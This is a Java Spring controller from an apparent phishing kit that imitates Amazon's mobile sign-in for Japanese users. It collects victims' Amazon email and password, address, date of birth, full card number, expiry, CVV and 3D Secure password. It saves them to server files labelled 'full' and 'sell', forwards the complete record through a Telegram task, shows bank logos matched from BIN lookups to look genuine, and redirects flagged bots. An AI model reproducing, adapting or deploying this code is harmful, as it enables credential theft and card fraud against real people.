package com.kidd.bank.web;


import cn.hutool.core.date.DateUtil;
import cn.hutool.core.io.FileUtil;
import cn.hutool.core.io.file.FileAppender;
import cn.hutool.http.Header;
import cn.hutool.http.HttpRequest;
import cn.hutool.json.JSONUtil;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.kidd.bank.common.IpUtils;
import com.kidd.bank.model.enums.CardType;
import com.kidd.bank.model.enums.FishCountryEnum;
import com.kidd.bank.service.CacheService;
import com.kidd.bank.task.AsyncTask;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.util.StringUtils;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.time.Clock;
import java.time.LocalDateTime;
import java.time.ZoneId;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;


@Controller
@Slf4j
public class Amazon3MobileController {
    @Autowired
    private HttpServletRequest request;

    @Autowired
    private AsyncTask asyncTask;

    @Autowired
    private HttpServletResponse response;

    @Autowired
    private CacheService cacheService;

    @Value("${google.secret:6LcEYsUaAAAAAAfTzIt86eSq8Yc0ljLMqzcoJMmF}")
    private String googleSecret;

    @Value("${fish.country:jp}")
    private String fishCountryCode;

    @GetMapping("/version3/mobile/signin")
    public Object signin(@RequestHeader("User-Agent") String uaStr,Model model) {
        FishCountryEnum countryEnum = FishCountryEnum.getByCountryCode(fishCountryCode);
        model.addAttribute("suffix",countryEnum.getSuffix());
        model.addAttribute("country",countryEnum.getCountryName());
        String ip = IpUtils.getIpAddress(request);
        String path = "/root/countClickLink3.txt";
        LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
        String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd HH:mm:ss");
        if (!FileUtil.exist(path)) {
            FileUtil.newFile(path);
        }
        FileAppender fileAppender = new FileAppender(FileUtil.file(path), 1000, true);
        fileAppender.append(timeStr + ":" + "|" + ip);
        fileAppender.flush();
        return "version3/mobile/index";
    }

    @GetMapping("/version3")
    public Object signin2(@RequestHeader("User-Agent") String uaStr) {
        String ip = IpUtils.getIpAddress(request);
        Integer isBot = (Integer) cacheService.getCommonCache(ip + "checkBot");
        if (null != isBot && isBot == 1) {
            return "redirect:/version3/mobile/signin";
        }
        return "index";
    }

    @GetMapping("/version3/mobile/homepage/billing")
    public Object update_billing(Model model) {
        FishCountryEnum countryEnum = FishCountryEnum.getByCountryCode(fishCountryCode);
        model.addAttribute("suffix",countryEnum.getSuffix());
        model.addAttribute("country",countryEnum.getCountryName());
        return "version3/mobile/billing";
    }

    @GetMapping("/version3/mobile/homepage/card")
    public Object card(Model model) {
        FishCountryEnum countryEnum = FishCountryEnum.getByCountryCode(fishCountryCode);
        model.addAttribute("suffix",countryEnum.getSuffix());
        model.addAttribute("country",countryEnum.getCountryName());
        return "version3/mobile/card";
    }

    @GetMapping("/version3/mobile/homepage/secure")
    public Object secure(Model model) {
        try {
            HttpSession session = request.getSession();
            Map<String, String> userInfoMap = (Map<String, String>) session.getAttribute("userInfo");
            String cardNumber = userInfoMap.get("cardnumber");
            String namecard = userInfoMap.get("namecard");
            String binInfo = userInfoMap.get("binInfo");
            if (StringUtils.isEmpty(cardNumber)) {
                cardNumber = "*****";
            }
            CardType cardType = CardType.getBydes(userInfoMap.get("cardType"));
            String bankImage = getBankImageByBinInfo(cardNumber, binInfo);
            LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
            String timeStr = DateUtil.format(localDateTime, "yyyy/MM/dd");
            model.addAttribute("dateTime", timeStr);
            model.addAttribute("cardName", namecard);
            model.addAttribute("image", cardType.getImageName());
            model.addAttribute("cardNo", cardNumber.substring(cardNumber.length() - 4, cardNumber.length()));
            if (!StringUtils.isEmpty(bankImage)) {
                model.addAttribute("bankImage", "card/a3/" + bankImage);
            }
            if (needWebId(cardNumber, binInfo)) {
                return "version3/mobile/secure3";
            }
        } catch (Exception e) {
            log.error("secure page error:{}", e.getMessage());
        }
        return "version3/mobile/secure2";
    }

    @GetMapping("/version3/mobile/homepage/success")
    public Object success(Model model) {
        FishCountryEnum countryEnum = FishCountryEnum.getByCountryCode(fishCountryCode);
        model.addAttribute("suffix",countryEnum.getSuffix());
        model.addAttribute("country",countryEnum.getCountryName());
        model.addAttribute("redUrl",countryEnum.getAmazonUrl());
        addCookie("kiddIp", IpUtils.getIpAddress(request));
        return "version3/mobile/success";
    }

    public void addCookie(String key, String value) {
        Cookie cookie = new Cookie(key, value);//创建新cookie
        cookie.setMaxAge(60 * 60 * 24 * 7);// 设置存在时间为5分钟
        cookie.setPath("/");//设置作用域
        response.addCookie(cookie);//将cookie添加到response的cookie数组中返回给客户端
    }

    @PostMapping("/version3/mobile/signin")
    @ResponseBody
    public Object signinPost() {
        Map<String, String[]> params = request.getParameterMap();
        HttpSession session = request.getSession();
        Map<String, String> userInfoMap = (Map<String, String>) session.getAttribute("userInfo");
        userInfoMap.put("AmazonId", params.get("email") != null ? params.get("email")[0] : "");
        userInfoMap.put("AmazonPwd", params.get("password") != null ? params.get("password")[0] : "");
        session.setAttribute("userInfo", userInfoMap);
        LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
        String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd");
        asyncTask.asyncWriteMap(String.format("/root/version3-step1/%s.txt", timeStr), userInfoMap);
        return new HashMap<String, String>() {{
            put("data", "ok");
        }};
    }

    @PostMapping("/version3/mobile/homepage/billing")
    @ResponseBody
    public Object billingPost() {
        Map<String, String[]> params = request.getParameterMap();
        HttpSession session = request.getSession();
        Map<String, String> userInfoMap = (Map<String, String>) session.getAttribute("userInfo");
        userInfoMap.put("fullname", params.get("fullname") != null ? params.get("fullname")[0] : "");
        userInfoMap.put("stat", params.get("stat") != null ? params.get("stat")[0] : "");
        userInfoMap.put("address", params.get("address") != null ? params.get("address")[0] : "");
        userInfoMap.put("city", params.get("City") != null ? params.get("City")[0] : "");
        userInfoMap.put("zipcode", params.get("zipcode") != null ? params.get("zipcode")[0] : "");
        userInfoMap.put("phone", params.get("phonenumber") != null ? params.get("phonenumber")[0] : "");
        userInfoMap.put("dob", params.get("dob-year")[0] + "/" + params.get("dob-moon")[0] + "/" + params.get("dob-day")[0]);
        session.setAttribute("userInfo", userInfoMap);
        LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
        String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd");
        asyncTask.asyncWriteMap(String.format("/root/version3-step2/%s.txt", timeStr), userInfoMap);
        return new HashMap<String, String>() {{
            put("data", "ok");
        }};
    }

    @PostMapping("/version3/mobile/homepage/card")
    @ResponseBody
    public Object cardPost() {
        Map<String, String[]> params = request.getParameterMap();
        HttpSession session = request.getSession();
        Map<String, String> userInfoMap = (Map<String, String>) session.getAttribute("userInfo");
        userInfoMap.put("namecard", params.get("namecard")[0]);
        userInfoMap.put("cardnumber", params.get("cardnumber")[0]);
        userInfoMap.put("expire", params.get("month")[0] + "/" + params.get("year")[0]);
        userInfoMap.put("cvv", params.get("cvc")[0]);
        CardType cardType = CardType.detect(params.get("cardnumber")[0]);
        userInfoMap.put("cardType", cardType.getDescription());
        String binInfo = getBinInfo(params.get("cardnumber")[0]);
        userInfoMap.put("binInfo", binInfo);
        session.setAttribute("userInfo", userInfoMap);
        LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
        String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd");
        asyncTask.asyncWriteMap(String.format("/root/version2-step3/%s.txt", timeStr), userInfoMap);
        asyncTask.asyncSaveFish("/root/version3/lack" + timeStr + "/", userInfoMap);
        asyncTask.asyncSaveFish("/root/version3/sell" + timeStr + "/", userInfoMap);
        return new HashMap<String, String>() {{
            put("data", "ok");
        }};
    }

    @PostMapping("/version3/mobile/homepage/secure")
    @ResponseBody
    public Object securePost() {
        Map<String, String[]> params = request.getParameterMap();
        HttpSession session = request.getSession();
        Map<String, String> userInfoMap = (Map<String, String>) session.getAttribute("userInfo");
        if (null != params.get("mmname")) {
            userInfoMap.put("webid", params.get("mmname") != null ? params.get("mmname")[0] : "");
        }
        userInfoMap.put("3dSecret", params.get("passvbv") != null ? params.get("passvbv")[0] : "");
        session.setAttribute("userInfo", userInfoMap);
        LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
        String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd");
        asyncTask.asyncWriteMap(String.format("/root/version2-step4/%s.txt", timeStr), userInfoMap);
        asyncTask.asyncSendTgMsg(null, null, userInfoMap);
        asyncTask.asyncSaveFish("/root/version3/full" + timeStr + "/", userInfoMap);
        asyncTask.asyncSaveFish("/root/version3/sell" + timeStr + "/", userInfoMap);
        return new HashMap<String, String>() {{
            put("data", "ok");
        }};
    }

    private String getBinInfo(String cardNo) {
        String binInfo = "{}";
        try {
            binInfo = HttpRequest.get("https://lookup.binlist.net/" + cardNo)
                    .header(Header.USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36")//头信息，多个头信息多次调用此方法即可
                    .header("Accept-Version", "3")
                    .timeout(20000)//超时，毫秒
                    .execute().body();
        } catch (Exception e) {
            log.error("query bin fail:" + e.getMessage());
        }
        JSONObject jsonObject = JSON.parseObject(binInfo);
        if (jsonObject != null && jsonObject.containsKey("country")) {
            jsonObject.remove("country");
        }
        if (jsonObject != null && jsonObject.containsKey("number")) {
            jsonObject.remove("number");
        }
        return jsonObject.toJSONString();
    }

    @GetMapping("/version3/zipcode")
    @ResponseBody
    public Object zipcode(@RequestParam("zipcode") String zipCode, Model model) {
        String jstr = "";
        try {
            Map parm = new HashMap<String, String>();
            parm.put("zipcode", zipCode);
            String result = HttpRequest.post("http://zipcloud.ibsnet.co.jp/api/search")
                    .header(Header.USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36")//头信息，多个头信息多次调用此方法即可
                    .form(parm)//表单内容
                    .timeout(20000)//超时，毫秒
                    .execute().body();
            cn.hutool.json.JSONObject jobj = JSONUtil.parseObj(result);
            jstr = JSONUtil.toJsonStr(jobj);
        } catch (Exception e) {
            HashMap<String, Object> map = new HashMap<>();
            map.put("status", 500);
            map.put("message", null);
            map.put("results", null);
            jstr = JSONUtil.toJsonStr(map);
        }
        return jstr;
    }

    private boolean needWebId(String cardNumber, String binInfo) {
        List<String> webIdBin = Arrays.asList("467924", "464988");
        if (webIdBin.contains(cardNumber.substring(0, 6))) {
            return true;
        }
        if (null != binInfo) {
            JSONObject binJson = JSON.parseObject(binInfo);
            if (binJson.containsKey("bank")) {
                JSONObject bankJSON = binJson.getJSONObject("bank");
                if (bankJSON.containsKey("name")) {
                    String bankName = bankJSON.getString("name");
                    if (bankName.toUpperCase().contains("LIFECARD")) {
                        return true;
                    }
                    if (bankName.toUpperCase().contains("APLUS")) {
                        return true;
                    }
                    if (bankName.toUpperCase().contains("NICOS")) {
                        return true;
                    }
                }
            }
        }
        return false;
    }

    private String getBankImageByBinInfo(String cardNumber, String binInfo) {
        String bankImage = "";
        if (null != binInfo) {
            JSONObject binJson = JSON.parseObject(binInfo);
            if (binJson.containsKey("bank")) {
                JSONObject bankJSON = binJson.getJSONObject("bank");
                if (bankJSON.containsKey("name")) {
                    String bankName = bankJSON.getString("name");
                    if (bankName.contains("SUMITOMO MITSUI") || bankName.contains("MITSUI SUMITOMO") || bankName.contains("WELLS FARGO BANK")) {
                        return "smbc.gif";
                    }
                    if (bankName.toUpperCase().contains("UC CARD")) {
                        return "uc.png";
                    }
                    if (bankName.toUpperCase().contains("APLUS")) {
                        return "aplus.jpg";
                    }
                    if (bankName.toUpperCase().contains("NICOS")) {
                        return "nicos.gif";
                    }
                    if (bankName.toUpperCase().contains("UFJ")) {
                        return "mufg.jpg";
                    }
                    if (bankName.toUpperCase().contains("AEON")) {
                        return "aeon.png";
                    }
                    if (bankName.toUpperCase().contains("RAKUTEN")) {
                        return "rakuten.png";
                    }
                    if (bankName.toUpperCase().contains("CREDIT SAISON")) {
                        return "creditsaison.png";
                    }
                    if (bankName.toUpperCase().contains("LIFECARD")) {
                        return "lifecard.jpg";
                    }
                    if (bankName.toUpperCase().contains("NANTO")) {
                        return "nanto.gif";
                    }
                    if (bankName.toUpperCase().contains("EPOS")) {
                        return "epos.jpg";
                    }
                    if (bankName.toUpperCase().contains("OMC CARD")) {
                        return "omc.png";
                    }
                    if (bankName.toUpperCase().contains("TOYOTA")) {
                        return "toyota.png";
                    }
                    if (bankName.toUpperCase().contains("ORIENT")) {
                        return "orico.gif";
                    }
                    if (bankName.toUpperCase().contains("KOKUNAI")) {
                        return "kc.png";
                    }
                    if (bankName.toUpperCase().contains("DC CARD")) {
                        return "dc.png";
                    }
                    if (bankName.toUpperCase().contains("VJA")) {
                        return "jaccs.gif";
                    }
                } else {
                    if (cardNumber.contains("467924") || cardNumber.contains("464988")) {
                        return "paypay.gif";
                    }
                }

            }
        }
        return bankImage;
    }
}
